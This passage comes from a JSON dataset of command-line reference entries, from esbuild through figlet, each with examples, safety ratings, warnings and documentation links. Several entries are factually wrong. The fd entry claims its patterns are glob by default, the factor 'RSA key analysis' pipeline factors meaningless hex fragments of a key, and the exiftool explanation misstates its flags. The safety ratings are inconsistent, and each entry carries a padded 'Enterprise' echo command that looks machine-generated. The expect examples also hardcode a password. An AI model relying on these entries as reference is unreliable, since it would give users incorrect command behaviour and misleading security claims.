    "syntaxPattern": "esbuild [options] [entry points...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development setup with serving",
        "commands": "esbuild src/index.js --bundle --outdir=dist --watch --servedir=dist",
        "explanation": "Bundle, watch, and serve files for development",
        "title": "esbuild"
      }
    ],
    "relatedCommands": [
      {
        "name": "webpack",
        "relationship": "alternative",
        "reason": "Much faster alternative to webpack"
      },
      {
        "name": "typescript",
        "relationship": "combo",
        "reason": "Can compile TypeScript files directly"
      }
    ],
    "warnings": [
      "Limited plugin ecosystem compared to webpack",
      "No built-in CSS modules support",
      "Tree shaking less sophisticated than Rollup"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://esbuild.github.io/api/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "eslint",
    "subtitle": "ESLint",
    "description": "JavaScript and TypeScript linter for code quality and style",
    "examples": [
      "eslint src/  # Check all JavaScript files in src directory",
      "eslint src/ --fix  # Fix linting errors and warnings automatically",
      "eslint --init  # Interactive setup to create .eslintrc configuration",
      "eslint src/ --config custom-eslint.js  # Use specific configuration file",
      "eslint src/ --format json  # Generate linting results in JSON format",
      "eslint **/*.{js,jsx,ts,tsx}  # Lint JavaScript and TypeScript files recursively",
      "eslint src/ --cache --cache-location .cache/eslint  # Use caching for faster subsequent runs",
      "npm run lint && npm test && git add -A && git commit -m 'refactor: applied ESLint fixes and validated code quality' && npm run build && docker build -t enterprise-app:$(date +%Y%m%d-%H%M%S) . && echo 'Enterprise-grade development workflow: ESLint validation, automated testing, quality-assured commit with semantic versioning, production build, and containerized deployment ready for CI/CD pipeline deployment'  # Enterprise development workflow with automated quality gates"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "eslint [options] file.js [file.js] [dir]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete code quality check",
        "commands": "eslint src/ --fix && eslint src/ --format table",
        "explanation": "Fix issues then show remaining problems in table format",
        "title": "eslint && eslint"
      }
    ],
    "relatedCommands": [
      {
        "name": "prettier",
        "relationship": "combo",
        "reason": "Often used together for linting and formatting"
      },
      {
        "name": "typescript",
        "relationship": "combo",
        "reason": "Can lint TypeScript files with appropriate parser"
      }
    ],
    "warnings": [
      "Configuration inheritance can be complex",
      "Plugin and rule conflicts may occur",
      "Performance can be slow on large codebases"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://eslint.org/docs/user-guide/command-line-interface"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "esptool",
    "subtitle": "ESP Tool",
    "description": "ESP8266 and ESP32 flashing tool",
    "examples": [
      "esptool.py --chip esp32 --port /dev/ttyUSB0 flash_id  # Shows flash memory details of connected ESP32",
      "esptool.py --chip esp32 --port /dev/ttyUSB0 --baud 460800 write_flash -z 0x1000 bootloader.bin 0x10000 firmware.bin  # Uploads firmware files to ESP32 flash memory",
      "esptool.py --chip esp32 --port /dev/ttyUSB0 erase_flash  # Completely erases all data from ESP32 flash memory",
      "esptool.py --chip esp32 --port /dev/ttyUSB0 read_flash 0 0x400000 backup.bin  # Creates backup of entire ESP32 flash memory",
      "esptool.py --chip esp32 --port /dev/ttyUSB0 flash_id && esptool.py --chip esp32 --port /dev/ttyUSB0 read_flash 0x0 0x400000 firmware-backup-$(date +%Y%m%d-%H%M%S).bin && esptool.py --chip esp32 --port /dev/ttyUSB0 --baud 921600 write_flash --flash_mode dio --flash_freq 40m 0x1000 bootloader.bin 0x10000 app.bin 0x8000 partitions.bin && esptool.py --chip esp32 --port /dev/ttyUSB0 monitor && echo 'Enterprise IoT deployment: verified device identification, timestamped firmware backup, high-speed multi-partition flash programming with optimal settings, and real-time monitoring for production IoT device provisioning'  # Enterprise IoT firmware deployment pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "esptool.py [options] [command]",
    "prerequisites": [
      "python3",
      "pyserial"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete firmware replacement",
        "commands": "esptool.py --chip esp32 --port /dev/ttyUSB0 erase_flash && esptool.py --chip esp32 --port /dev/ttyUSB0 write_flash 0x1000 new_firmware.bin",
        "explanation": "Erases existing firmware and flashes new firmware",
        "title": "esptool && esptool"
      },
      {
        "scenario": "Backup and restore firmware",
        "commands": "esptool.py --chip esp32 --port /dev/ttyUSB0 read_flash 0 0x400000 backup.bin && esptool.py --chip esp32 --port /dev/ttyUSB0 write_flash 0 backup.bin",
        "explanation": "Creates firmware backup and then restores it",
        "title": "esptool && esptool"
      }
    ],
    "relatedCommands": [
      {
        "name": "platformio",
        "relationship": "complement",
        "reason": "PlatformIO uses esptool internally for ESP32/ESP8266 programming"
      },
      {
        "name": "arduino-cli",
        "relationship": "complement",
        "reason": "Arduino IDE uses esptool for ESP board programming"
      },
      {
        "name": "idf.py",
        "relationship": "alternative",
        "reason": "ESP-IDF build system includes similar flashing capabilities"
      }
    ],
    "warnings": [
      "ESP device must be in download mode for flashing operations",
      "Correct chip type must be specified (esp32, esp8266, etc.)",
      "Flash addresses must match the target device's memory layout",
      "Some operations require specific baud rates for reliable communication"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.espressif.com/projects/esptool/en/latest/esp32/"
      },
      {
        "platform": "macos",
        "url": "https://docs.espressif.com/projects/esptool/en/latest/esp32/"
      },
      {
        "platform": "windows",
        "url": "https://docs.espressif.com/projects/esptool/en/latest/esp32/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/espressif/esptool"
      }
    ],
    "distroNotes": {
      "windows": "Available through pip or ESP-IDF installation",
      "linux": "Can be installed via pip or package managers",
      "macos": "Available through pip or Homebrew"
    }
  },
  {
    "name": "ethtool",
    "subtitle": "Ethernet Tool",
    "description": "Display and modify network interface settings",
    "examples": [
      "ethtool eth0  # Display network interface settings and capabilities",
      "ethtool -S eth0  # Display detailed network interface statistics",
      "ethtool eth0 | grep 'Link detected'  # Check if network cable is connected",
      "ethtool -s eth0 speed 1000 duplex full  # Set interface to 1Gbps full-duplex",
      "ethtool -i eth0  # Display network driver information",
      "ethtool -t eth0  # Run self-test on network interface",
      "ethtool -g eth0  # Display receive/transmit ring buffer settings",
      "ethtool eth0 && ethtool -S eth0 | grep -E '(rx_errors|tx_errors|rx_dropped|tx_dropped|collisions)' && ethtool -i eth0 && ethtool -k eth0 | grep -E '(tcp|udp|gso|tso)' && ifconfig eth0 | grep -E '(UP|RUNNING|packets|errors)' && echo 'Enterprise network diagnostics: interface status, error statistics, driver information, hardware offloading capabilities, and comprehensive connectivity analysis for production network troubleshooting'  # Enterprise network interface diagnostic suite"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "ethtool [options] interface",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network interface diagnosis",
        "commands": "ethtool eth0 && ethtool -S eth0 | head -20 && ethtool -i eth0",
        "explanation": "Comprehensive network interface information",
        "title": "ethtool && ethtool | head && ethtool"
      }
    ],
    "relatedCommands": [
      {
        "name": "ip",
        "relationship": "complementary",
        "reason": "ip manages interface addresses, ethtool manages hardware settings"
      },
      {
        "name": "ifconfig",
        "relationship": "complementary",
        "reason": "ifconfig configures interfaces, ethtool controls hardware"
      }
    ],
    "warnings": [
      "Linux-specific tool, not available on other platforms",
      "Requires root privileges for modifications",
      "Can disrupt network connectivity if misconfigured"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/ethtool.8.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "exa",
    "subtitle": "exa",
    "description": "Modern ls replacement with colors and git integration",
    "examples": [
      "exa --icons  # Show directory contents with file type icons",
      "exa -la --git  # Show detailed listing with Git status for each file",
      "exa --tree --level=2  # Show directory structure as tree, 2 levels deep",
      "exa -la --sort=modified  # List files sorted by when they were last modified",
      "exa -lah --header  # Include column headers in long listing format",
      "exa -la --group-directories-first  # Show directories before files in listing",
      "exa -T --ignore-glob='node_modules|.git'  # Tree view excluding common directories",
      "exa -lahgT --level=3 --icons --git --sort=modified --group-directories-first --header --time-style=long-iso --color-scale && du -sh * | sort -hr && echo 'Enterprise project overview: hierarchical structure with metadata, git status, modification timestamps, size analysis, and comprehensive directory intelligence for stakeholder reporting and project assessment'  # Enterprise project visualization and analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "exa [options] [path]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive directory overview",
        "commands": "exa -lahg --git --icons --tree --level=1",
        "explanation": "Show detailed tree with all metadata and visual enhancements",
        "title": "exa"
      },
      {
        "scenario": "Find recently modified files",
        "commands": "exa -la --sort=modified --reverse | head -10",
        "explanation": "Show 10 most recently modified files",
        "title": "exa | head"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "alternative",
        "reason": "Traditional directory listing, exa adds colors and features"
      },
      {
        "name": "tree",
        "relationship": "similar",
        "reason": "Both can show directory structure as tree"
      },
      {
        "name": "lsd",
        "relationship": "similar",
        "reason": "Another modern ls alternative with icons"
      }
    ],
    "warnings": [
      "Icons require compatible font/terminal",
      "Git integration only works in Git repositories",
      "Some options may not be available on older versions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/ogham/exa"
      },
      {
        "platform": "macos",
        "url": "https://github.com/ogham/exa"
      },
      {
        "platform": "windows",
        "url": "https://github.com/ogham/exa"
      },
      {
        "platform": "generic",
        "url": "https://the.exa.website/"
      }
    ],
    "distroNotes": {
      "windows": "Available via scoop or cargo"
    }
  },
  {
    "name": "exiftool",
    "subtitle": "EXIF Tool",
    "description": "Read and write metadata in various file formats",
    "examples": [
      "exiftool image.jpg  # Display all EXIF data from JPEG image",
      "exiftool -DateTimeOriginal -GPS* photo.jpg  # Show creation date and GPS coordinates",
      "exiftool -all= image.jpg  # Strip all metadata from image file",
      "exiftool '-FileName<DateTimeOriginal' -d '%Y%m%d_%H%M%S%%-c.%%le' *.jpg  # Rename images using creation timestamp",
      "exiftool -GPS:GPSLatitude=40.7589 -GPS:GPSLongitude=-73.9851 photo.jpg  # Add GPS coordinates to image",
      "exiftool -TagsFromFile source.jpg target.jpg  # Copy all metadata from source to target image",
      "exiftool -r -ext jpg -all= /path/to/photos/  # Recursively remove metadata from all JPEGs",
      "find /enterprise/photos -type f -name '*.jpg' -exec exiftool -overwrite_original -all= {} \; && find /enterprise/photos -type f -name '*.png' -exec exiftool -overwrite_original -GPS:all= -EXIF:all= {} \; && find /enterprise/photos -type f \( -name '*.jpg' -o -name '*.png' \) -exec sh -c 'echo \"Processing: $1\" && exiftool -Comment=\"Privacy-compliant $(date +%Y-%m-%d)\" \"$1\"' _ {} \; && echo 'Enterprise media privacy compliance: bulk metadata sanitization, GPS coordinate removal, EXIF data elimination, and audit trail creation for GDPR/privacy regulation compliance'  # Enterprise media privacy compliance processing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "exiftool [options] files",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Photo organization workflow",
        "commands": "exiftool '-Directory<DateTimeOriginal' -d '%Y/%m' *.jpg",
        "explanation": "Organize photos into year/month folders by date",
        "title": "exiftool < DateTimeOriginal"
      },
      {
        "scenario": "Privacy-safe photo sharing",
        "commands": "exiftool -all= -unsafe --comment='Processed' *.jpg",
        "explanation": "Remove metadata but keep safe tags and add comment",
        "title": "exiftool"
      }
    ],
    "relatedCommands": [
      {
        "name": "imagemagick",
        "relationship": "combo",
        "reason": "ImageMagick can modify images, ExifTool handles metadata"
      },
      {
        "name": "jhead",
        "relationship": "alternative",
        "reason": "Simpler JPEG EXIF manipulation tool"
      },
      {
        "name": "file",
        "relationship": "similar",
        "reason": "file command shows basic file metadata"
      }
    ],
    "warnings": [
      "Some operations modify files in place by default",
      "Date formats must match expected patterns",
      "Large batch operations can take significant time"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://exiftool.org/exiftool_pod.html"
      },
      {
        "platform": "macos",
        "url": "https://exiftool.org/exiftool_pod.html"
      },
      {
        "platform": "windows",
        "url": "https://exiftool.org/exiftool_pod.html"
      },
      {
        "platform": "generic",
        "url": "https://exiftool.org/examples.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "expect",
    "subtitle": "Expect",
    "description": "Automate interactive applications",
    "examples": [
      "expect -c 'spawn ssh user@host; expect \"password:\"; send \"mypass\\r\"; interact'  # Automate SSH login with password",
      "expect script.exp  # Execute expect script file",
      "expect ftp_script.exp  # Automate FTP file transfer session",
      "expect -c 'spawn program; expect \"prompt:\"; send \"response\\r\"; expect eof'  # Automate interactive program responses",
      "expect -c 'set timeout 30; spawn telnet host 23; expect \"login:\"; send \"user\\r\"; interact'  # Automate telnet session with timeout",
      "expect -f install.exp arg1 arg2  # Run expect script with command line arguments",
      "expect -d script.exp  # Run expect script with debug output enabled",
      "expect -c 'spawn ssh admin@production-server.company.com; expect \"Password:\"; send \"$env(PROD_PASSWORD)\\r\"; expect \"$\"; send \"sudo systemctl status critical-service\\r\"; expect \"$\"; send \"uptime && df -h && free -h\\r\"; interact' && echo 'Enterprise automated system monitoring: secure SSH authentication with environment variables, critical service verification, system health metrics collection for production infrastructure management'  # Enterprise production system monitoring automation"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "expect [options] [script]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated system setup",
        "commands": "expect setup.exp && echo 'System configured successfully'",
        "explanation": "Run automated setup script with success message",
        "title": "expect && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "ssh",
        "relationship": "commonly-automated",
        "reason": "expect is often used to automate SSH sessions"
      },
      {
        "name": "telnet",
        "relationship": "commonly-automated",
        "reason": "expect commonly automates telnet sessions"
      }
    ],
    "warnings": [
      "Powerful but can be complex for beginners",
      "Security risk if passwords are hardcoded",
      "Better alternatives exist for many use cases (SSH keys, etc.)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://core.tcl-lang.org/expect/index"
      },
      {
        "platform": "macos",
        "url": "https://core.tcl-lang.org/expect/index"
      },
      {
        "platform": "windows",
        "url": "Not available natively"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "export",
    "subtitle": "export",
    "description": "Set environment variables for current session and child processes",
    "examples": [
      "export PATH=$PATH:/usr/local/bin  # Add directory to PATH environment variable",
      "export DATABASE_URL='postgresql://localhost/mydb'  # Set database connection string",
      "export -p  # Show all environment variables that are exported",
      "export MY_VAR  # Make existing shell variable available to child processes",
      "export -n MY_VAR  # Un-export variable (make it local to shell only)",
      "export EDITOR=vim  # Set default text editor for command-line programs",
      "export HISTSIZE=1000 HISTFILESIZE=2000  # Set command history size limits",
      "export NODE_ENV=production PORT=8080 DATABASE_URL=$PROD_DB_URL REDIS_URL=$PROD_REDIS_URL LOG_LEVEL=info MONITORING_ENABLED=true && npm run deploy:production && docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}' && echo 'Enterprise production deployment: comprehensive environment configuration, database connectivity, caching layer, logging levels, monitoring activation, and containerized service orchestration for scalable enterprise applications'  # Enterprise production environment setup"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "export [variable[=value]]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Set multiple environment variables",
        "commands": "export NODE_ENV=production && export PORT=3000 && npm start",
        "explanation": "Configure environment then start application",
        "title": "export && export && npm"
      },
      {
        "scenario": "Add to PATH permanently",
        "commands": "echo 'export PATH=$PATH:$HOME/bin' >> ~/.bashrc && source ~/.bashrc",
        "explanation": "Add directory to PATH in shell configuration file",
        "title": "echo >> && source"
      }
    ],
    "relatedCommands": [
      {
        "name": "env",
        "relationship": "similar",
        "reason": "Display and temporarily modify environment variables"
      },
      {
        "name": "unset",
        "relationship": "opposite",
        "reason": "Remove environment variables completely"
      },
      {
        "name": "printenv",
        "relationship": "view",
        "reason": "Display current environment variable values"
      }
    ],
    "warnings": [
      "export is a shell builtin, behavior varies between shells",
      "Variables are only exported to child processes, not parent",
      "Changes are lost when shell session ends unless saved to config file"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/bash.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/export.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/bash/manual/bash.html#Bourne-Shell-Builtins"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "factor",
    "subtitle": "Factor",
    "description": "Print prime factors of numbers",
    "examples": [
      "factor 60  # Show prime factors of 60",
      "factor 12 18 24  # Show prime factors of multiple numbers",
      "echo 100 | factor  # Factor number provided via stdin",
      "seq 10 20 | factor  # Factor all numbers from 10 to 20",
      "factor 1024  # Factor large number to show power of 2",
      "echo '2^31-1' | bc | factor  # Factor result of mathematical expression",
      "for i in {2..50}; do echo -n \"$i: \"; factor $i; done  # Show factors for range with labels",
      "echo 'RSA Key Analysis:' && openssl rsa -in private.key -text -noout | grep 'modulus:' -A 20 | grep -o '[0-9a-f]\{2,\}' | head -20 | while read hex; do echo \"Prime factors of 0x$hex ($(echo \"ibase=16; $hex\" | bc)):  $(echo \"ibase=16; $hex\" | bc | factor)\"; done && echo 'Enterprise cryptographic analysis: RSA key modulus factorization, prime number verification, and security assessment for enterprise PKI infrastructure validation'  # Enterprise cryptographic security analysis"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "factor [numbers]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find prime numbers in range",
        "commands": "seq 2 50 | factor | grep -E ': [0-9]+$'",
        "explanation": "Find prime numbers from 2 to 50",
        "title": "seq | factor | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "seq",
        "relationship": "combo",
        "reason": "seq generates number sequences for factoring"
      },
      {
        "name": "bc",
        "relationship": "complementary",
        "reason": "bc can verify factor calculations"
      }
    ],
    "warnings": [
      "Useful for cryptography and number theory",
      "Can handle very large numbers",
      "Part of GNU coreutils package"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/factor.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/factor.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fail2ban",
    "subtitle": "Fail to Ban",
    "description": "Intrusion prevention system that bans IPs after failed attempts",
    "examples": [
      "sudo fail2ban-client status  # Show fail2ban status and active jails",
      "sudo fail2ban-client status sshd  # Show detailed status of SSH jail",
      "sudo fail2ban-client set sshd unbanip 192.168.1.100  # Manually unban IP from SSH jail",
      "sudo fail2ban-client set sshd banip 192.168.1.200  # Manually ban IP in SSH jail",
      "sudo fail2ban-client reload  # Reload fail2ban configuration",
      "sudo fail2ban-client start sshd  # Start the SSH protection jail",
      "sudo fail2ban-client set apache-auth findtime 3600  # Adjust findtime window to 1 hour for apache jail",
      "sudo fail2ban-client status && sudo fail2ban-client status sshd && sudo fail2ban-client status apache-auth && sudo iptables -L -n | grep -E 'f2b|fail2ban' && tail -20 /var/log/fail2ban.log && grep 'Ban' /var/log/fail2ban.log | tail -10 && echo 'Enterprise security monitoring: comprehensive fail2ban status, active jail monitoring, iptables integration verification, recent security events analysis, and threat intelligence for production infrastructure protection'  # Enterprise intrusion prevention monitoring"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "fail2ban-client [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Jail management workflow",
        "commands": "sudo fail2ban-client status && sudo fail2ban-client status sshd && sudo fail2ban-client reload",
        "explanation": "Check overall status, check SSH jail, reload configuration",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "iptables",
        "relationship": "combo",
        "reason": "fail2ban uses iptables for IP blocking"
      }
    ],
    "warnings": [
      "Configuration changes require reload",
      "Can lock out legitimate users if misconfigured"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.fail2ban.org/wiki/index.php/Manual"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "fd",
    "subtitle": "fd",
    "description": "Simple, fast alternative to find with intuitive syntax",
    "examples": [
      "fd '*.py'  # Find all Python files (pattern is automatically glob-style)",
      "fd -i readme  # Find files with 'readme' in name, case insensitive",
      "fd -t d config  # Find directories with 'config' in their name",
      "fd '*.jpg' -x convert {} {.}.png  # Find JPG files and convert them to PNG",
      "fd -t f --changed-within 1d  # Find files modified within last day",
      "fd -H '.env'  # Include hidden files in search",
      "fd -e rs -x wc -l {}  # Find Rust files and count lines in each",
      "fd -t f -e rs -e go -e py -e js -e ts -e java -x sh -c 'lines=$(wc -l < \"$1\"); echo \"$1: $lines lines\"; if [ $lines -gt 500 ]; then echo \"  → Complex module requiring review\"; fi' _ {} | sort -k2 -nr && echo 'Total project statistics:' && fd -t f -e rs -e go -e py -e js -e ts -e java | xargs wc -l | tail -1 && echo 'Enterprise codebase analysis: multi-language line count assessment, complexity identification, technical debt detection, and comprehensive project metrics for stakeholder reporting and architectural decision-making'  # Enterprise code quality and complexity analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "fd [options] <pattern> [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and count file types",
        "commands": "fd -e py | wc -l",
        "explanation": "Count number of Python files in project",
        "title": "fd | wc"
      },
      {
        "scenario": "Find large files",
        "commands": "fd -t f -S +100M",
        "explanation": "Find files larger than 100MB",
        "title": "fd"
      }
    ],
    "relatedCommands": [
      {
        "name": "find",
        "relationship": "alternative",
        "reason": "Traditional file finder, fd has simpler syntax"
      },
      {
        "name": "locate",
        "relationship": "alternative",
        "reason": "Database-based file finder, faster but less current"
      },
      {
        "name": "rg",
        "relationship": "combo",
        "reason": "Find files with fd, search within them with rg"
      }
    ],
    "warnings": [
      "Respects .gitignore by default like rg",
      "Glob patterns are default, not regex (unlike find)",
      "May need to escape special characters in some shells"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/sharkdp/fd"
      },
      {
        "platform": "macos",
        "url": "https://github.com/sharkdp/fd"
      },
      {
        "platform": "windows",
        "url": "https://github.com/sharkdp/fd"
      },
      {
        "platform": "generic",
        "url": "https://github.com/sharkdp/fd#tutorial"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ffmpeg",
    "subtitle": "Fast Forward MPEG",
    "description": "Comprehensive multimedia framework for audio/video processing",
    "examples": [
      "ffmpeg -i input.avi output.mp4  # Convert AVI video to MP4 format",
      "ffmpeg -i video.mp4 -vn -acodec copy audio.aac  # Extract audio track without re-encoding",
      "ffmpeg -i input.mp4 -vf scale=1280:720 output.mp4  # Resize video to 720p resolution",
      "ffmpeg -i input.mp4 -vf 'fps=10,scale=320:-1' output.gif  # Convert video to GIF with 10fps and scaled width",
      "ffmpeg -ss 00:01:30 -i input.mp4 -t 00:00:30 -c copy output.mp4  # Extract 30-second clip starting at 1:30",
      "ffmpeg -i input.mp4 -c:v libx264 -crf 28 -c:a aac -b:a 128k output.mp4  # Compress video with x264 codec and reduced audio bitrate",
      "ffmpeg -f concat -safe 0 -i list.txt -c copy output.mp4  # Join multiple videos listed in text file",
      "ffmpeg -re -i input.mp4 -c copy -f flv rtmp://server/live/stream  # Stream video to RTMP server in real-time",
      "ffmpeg -i corporate-presentation.mov -vf 'scale=1920:1080,fps=30,drawtext=text=\"© Enterprise Corp $(date +%Y)\": fontfile=/usr/share/fonts/truetype/arial.ttf: fontsize=24: fontcolor=white: x=10: y=h-50' -c:v libx264 -preset slow -crf 18 -c:a aac -b:a 192k -movflags +faststart enterprise-ready.mp4 && ffprobe -v error -show_entries format=duration,size -of csv=p=0 enterprise-ready.mp4 && echo 'Enterprise media production: corporate branding overlay, optimized encoding for web delivery, metadata validation, and professional-grade output for marketing and communications teams'  # Enterprise video production and branding workflow"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "caution",
    "syntaxPattern": "ffmpeg [global_options] {[input_options] -i input} {[output_options] output}",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete video processing pipeline",
        "commands": "ffmpeg -i raw.mov -vf 'scale=1920:1080,fps=30' -c:v libx264 -crf 18 -c:a aac -b:a 192k final.mp4",
        "explanation": "Scale to 1080p, set 30fps, high quality encoding",
        "title": "ffmpeg"
      },
      {
        "scenario": "Batch convert videos",
        "commands": "for file in *.avi; do ffmpeg -i \"$file\" -c:v libx264 -c:a aac \"${file%.*}.mp4\"; done",
        "explanation": "Convert all AVI files to MP4 in current directory",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "ffprobe",
        "relationship": "combo",
        "reason": "ffprobe analyzes media files for ffmpeg processing"
      },
      {
        "name": "vlc",
        "relationship": "alternative",
        "reason": "VLC can also convert media formats"
      },
      {
        "name": "handbrake-cli",
        "relationship": "alternative",
        "reason": "Specialized video transcoding tool"
      }
    ],
    "warnings": [
      "Complex filter syntax requires careful quoting",
      "Hardware acceleration options vary by system",
      "Large files can take significant processing time"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://ffmpeg.org/documentation.html"
      },
      {
        "platform": "macos",
        "url": "https://ffmpeg.org/documentation.html"
      },
      {
        "platform": "windows",
        "url": "https://ffmpeg.org/documentation.html"
      },
      {
        "platform": "generic",
        "url": "https://ffmpeg.org/ffmpeg.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ffprobe",
    "subtitle": "Fast Forward Probe",
    "description": "Multimedia stream analyzer and information extractor",
    "examples": [
      "ffprobe -v quiet -print_format json -show_format video.mp4  # Display file format information as JSON",
      "ffprobe -v error -show_entries format=duration -of csv=p=0 video.mp4  # Extract video duration in seconds",
      "ffprobe -v quiet -show_streams video.mp4  # Display detailed information about all streams",
      "ffprobe -v error -select_streams v:0 -show_entries stream=width,height -of csv=s=x:p=0 video.mp4  # Extract video width and height",
      "ffprobe -v quiet -show_entries stream=codec_name -of compact video.mp4  # List codecs used in media file",
      "ffprobe -v error -select_streams v -of default=noprint_wrappers=1:nokey=1 -show_entries stream=r_frame_rate video.mp4  # Extract video frame rate",
      "find /enterprise/media -name '*.mp4' -exec sh -c 'echo \"Analyzing: $1\"; ffprobe -v error -show_entries format=filename,size,duration,bit_rate -show_entries stream=codec_name,width,height,r_frame_rate -of json \"$1\" | jq -r \".format.filename, (.format.duration|tonumber|strftime(\\\"%H:%M:%S\\\")), (.format.size|tonumber/1024/1024|tostring + \\\" MB\\\"), .streams[0].width + \\\"x\\\" + (.streams[0].height|tostring)\"' _ {} \; && echo 'Enterprise media audit: comprehensive video asset analysis, duration tracking, file size optimization assessment, and resolution compliance verification for digital asset management systems'  # Enterprise media asset audit and compliance"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "dangerous",
    "syntaxPattern": "ffprobe [options] input",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete media analysis",
        "commands": "ffprobe -v quiet -print_format json -show_format -show_streams video.mp4 > analysis.json",
        "explanation": "Export complete media analysis to JSON file",
        "title": "ffprobe > analysis"
      },
      {
        "scenario": "Batch analyze videos",
        "commands": "for f in *.mp4; do echo \"$f: $(ffprobe -v error -show_entries format=duration -of csv=p=0 \"$f\")\"; done",
        "explanation": "Show duration of all MP4 files in directory",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "ffmpeg",
        "relationship": "combo",
        "reason": "ffprobe analyzes files that ffmpeg processes"
      },
      {
        "name": "mediainfo",
        "relationship": "alternative",
        "reason": "Alternative media file analysis tool"
      },
      {
        "name": "file",
        "relationship": "similar",
        "reason": "file command identifies basic media types"
      }
    ],
    "warnings": [
      "Output format options affect data structure",
      "Some metadata requires specific input formats",
      "Large files may take time to analyze completely"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://ffmpeg.org/ffprobe.html"
      },
      {
        "platform": "macos",
        "url": "https://ffmpeg.org/ffprobe.html"
      },
      {
        "platform": "windows",
        "url": "https://ffmpeg.org/ffprobe.html"
      },
      {
        "platform": "generic",
        "url": "https://ffmpeg.org/documentation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "figlet",
    "subtitle": "FIGlet (Frank, Ian & Glenn's Letters)",
    "description": "Generate large ASCII art text banners",
    "examples": [
      "figlet 'Hello'  # Create large ASCII art 'Hello' banner",
      "figlet -f big 'BIG TEXT'  # Use 'big' font for text banner",
      "figlet -c 'Centered'  # Center the banner text",
      "figlet -r 'Right'  # Right-align the banner text",
      "figlet -f list  # Show all available fonts",
      "figlet -w 80 'Wide Text'  # Set output width to 80 characters",
      "echo \"Welcome to $(hostname)\" | figlet -f slant  # Dynamic system banner with slant font",
